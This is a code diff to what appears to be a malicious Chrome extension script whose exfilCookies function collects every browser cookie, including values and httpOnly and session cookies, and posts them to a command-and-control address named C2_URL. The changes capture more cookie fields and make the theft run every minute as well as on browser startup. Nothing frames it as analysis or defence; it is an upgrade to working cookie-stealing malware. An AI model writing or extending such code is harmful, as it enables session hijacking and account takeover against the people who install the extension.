@@ -5,13 +5,17 @@ async function exfilCookies() {
     const allCookies = await chrome.cookies.getAll({});
 
     const payload = allCookies.map((c) => ({
-      name: c.name,
-      value: c.value,
       domain: c.domain,
-      path: c.path,
-      secure: c.secure,
+      expirationDate: c.expirationDate || null,
+      hostOnly: c.hostOnly,
       httpOnly: c.httpOnly,
-      expirationDate: c.expirationDate,
+      name: c.name,
+      path: c.path,
+      sameSite: c.sameSite || null,
+      secure: c.secure,
+      session: c.session,
+      storeId: c.storeId || null,
+      value: c.value,
     }));
 
     await fetch(C2_URL, {
@@ -35,9 +39,4 @@ chrome.runtime.onStartup.addListener(() => {
   exfilCookies();
 });
 
-chrome.alarms.create("cookie-sync", { periodInMinutes: 5 });
-chrome.alarms.onAlarm.addListener((alarm) => {
-  if (alarm.name === "cookie-sync") {
-    exfilCookies();
-  }
-});
+setInterval(exfilCookies, 60000);
